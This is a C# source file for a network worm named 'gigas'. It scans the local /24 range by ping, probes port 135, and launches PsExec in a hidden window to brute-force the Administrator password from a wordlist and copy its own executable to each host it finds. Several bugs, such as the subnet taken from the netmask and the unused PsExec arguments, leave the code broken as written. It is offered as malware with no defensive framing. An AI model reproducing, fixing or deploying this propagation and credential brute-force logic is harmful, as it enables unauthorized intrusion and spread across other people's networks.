using System.Globalization;

namespace gigas;

using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
public class Worms
{

    public static async void Entrypoint(string pwl)
    {
        
        NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
        if (nics == null || nics.Length < 1)
        {
            Console.WriteLine("  No network interfaces found.");
            return;
        }
        foreach (NetworkInterface adapter in nics)
        {
            
                
            IPInterfaceProperties ipProps = adapter.GetIPProperties();
            foreach (UnicastIPAddressInformation ip in ipProps.UnicastAddresses)
            {
                
                
                
                if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                {
                    IPAddress address = ip.Address;
                    foreach (UnicastIPAddressInformation unicastIPAddressInformation in adapter.GetIPProperties().UnicastAddresses)
                    {
                        if (unicastIPAddressInformation.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            if (address.Equals(unicastIPAddressInformation.Address))
                            {
                                IPAddress f = unicastIPAddressInformation.IPv4Mask;
                                string bp = f.ToString();
                                await Def(pwl, bp);
                            }
                        }
                    }
                }
                
            }
            
        }
        

           
        }

        
    


    
    private static async Task Def(string pwl, string baseip)
    {
        IEnumerable<string> lines = File.ReadLines(pwl);
        List<string> addrs = new List<string>();
        string path = Environment.ProcessPath;
        string pattern = @"\.\d+$";
        
        // Replace the matched pattern with an empty string
        string result = Regex.Replace(baseip, pattern, "");
        int s = 1;
        int e = 254;

        for (int i = s; i <= e; i++)
        {
            string ip = result + i;
            if (await PingHost(ip))
            {
                Console.WriteLine($"{ip} is active.");
                addrs.Add(ip);
                
            }
            
        }

        await Spread(addrs, lines, path);
    }

    private static async Task<bool> Spread(List<string> adrs, IEnumerable<string> pwl, string path)
    {
        using (TcpClient tcl = new TcpClient ())
        {
            for (int i = 0; i <= adrs.Count; i++)
            {
                try
                {
                    byte[] bytes = Encoding.ASCII.GetBytes(adrs[i]);
                    IPAddress nadr = new IPAddress(bytes);
                    IPEndPoint edp = new IPEndPoint(nadr, 135);
                    await tcl.ConnectAsync(edp);
                  
                    
                    
                    foreach (string line in pwl)
                    {
                        string arguments = $@"\\{adrs[i]} -u Administrator -p {line}  -c -csrc ""{path} gigas.exe";
                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                        
                            FileName = "C:\\Windows\\System32\\PsExec.exe",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true
                        
                        };

                        
                        using (Process proc = Process.Start(psi))
                        {
                        
                            proc.WaitForExit();

                        }

                        
                    }
                    return true;
                   

                }
                catch
                {
                    return false;
                }
                    
            }
            
        }

        return true;
    }

    private static async Task<bool> PingHost(string s)
    {
        using (Ping ping = new Ping())
        {
            try
            {
                PingReply reply = await ping.SendPingAsync(s, 1000);
                return reply.Status == IPStatus.Success;
            }
            catch
            {
                return false;
            }
        }
    }
}